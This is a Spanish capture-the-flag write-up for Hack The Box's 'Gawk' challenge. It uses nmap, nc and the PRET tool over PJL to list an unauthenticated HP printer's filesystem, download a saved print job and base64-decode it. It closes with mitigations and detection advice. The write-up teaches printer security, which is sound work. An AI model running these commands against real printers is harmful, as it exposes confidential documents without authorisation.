---
challenge: Gawk
type: Hardware
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [hardware, printer, pjl, pret, path-traversal, base64]
---

# Gawk — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

El servicio es una impresora HP LaserJet que habla PJL. Con PRET se enumeran los directorios del dispositivo y se descarga un PDF guardado en una cola de impresión. El archivo descargado está en base64; al decodificarlo se abre el PDF y se lee la flag.

## Enunciado y superficie

- Hardware, Easy, retirado.
- Se entrega una IP y un puerto de impresora.
- El escenario pide ayudar a recuperar un documento de una impresora.

```bash
nmap -Pn -sV -p <PORT> <IP>
nc <IP> <PORT>
```

## Reconocimiento

- El puerto no responde a HTTP ni a un servicio identificable por `nmap`.
- Al conectar se obtiene un banner de impresora.
- PRET, con el modo `pjl`, identifica el dispositivo como HP LaserJet 4200.

```bash
python2.7 pret.py <IP>:<PORT> pjl
```

## Análisis del protocolo

PJL expone un sistema de archivos interno con comandos como `FSUPLOAD`, `FSDOWNLOAD`, `FSDIRLIST` y `FSQUERY`. PRET envuelve esos comandos y permite navegar con `ls`, `cd`, `find` y `get`.

```text
/> ls
d - PJL
d - PostScript
d - saveDevice
d - webServer
```

## Explicación del fallo

La impresora no autentica el acceso a PJL ni restringe la lectura del sistema de archivos. Los trabajos guardados en `saveDevice/SavedJobs/InProgress` son accesibles. El PDF se descarga con `get` y el contenido está codificado en base64, no cifrado.

## Reproducción local

```bash
# Requiere una impresora o un emulador PJL accesible.
python2.7 pret.py <IP>:<PORT> pjl
```

- PRET funciona con Python 2.7; se puede usar un contenedor.
- El comando `find` lista rutas y `get` descarga un archivo.

## Explotación

```text
/> find
/saveDevice/SavedJobs/InProgress/HR_Policies.pdf
/> get /saveDevice/SavedJobs/InProgress/HR_Policies.pdf
/> exit
```

```bash
file HR_Policies.pdf
base64 -d HR_Policies.pdf > HR_Policies_decoded.pdf
file HR_Policies_decoded.pdf
xdg-open HR_Policies_decoded.pdf
```

El PDF muestra la flag en la primera página; se redacta.

## Evidencia

- Banner y identificación de la impresora.
- Listado de `find` con la ruta del PDF.
- PDF decodificado, con la flag redactada.

## Lecciones aprendidas

- Las impresoras son dispositivos con sistema de archivos y servicios de red.
- PJL puede permitir lectura de trabajos y configuración sin autenticación.
- Un archivo con extensión PDF puede ser base64 y necesitar una decodificación.

## Mitigaciones y detección

- Deshabilitar PJL/FTP/PostScript no utilizados y segmentar la impresora.
- Requerir autenticación y limitar el acceso por IP.
- Borrar trabajos retenidos y auditar `FSUPLOAD`/`FSDOWNLOAD`.
- Alertar de comandos PJL, descargas de `saveDevice` y accesos desde hosts no administrativos.

## Referencias

- <https://www.hackthebox.com/challenges/Gawk>
- <https://github.com/RUB-NDS/PRET>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1005/>
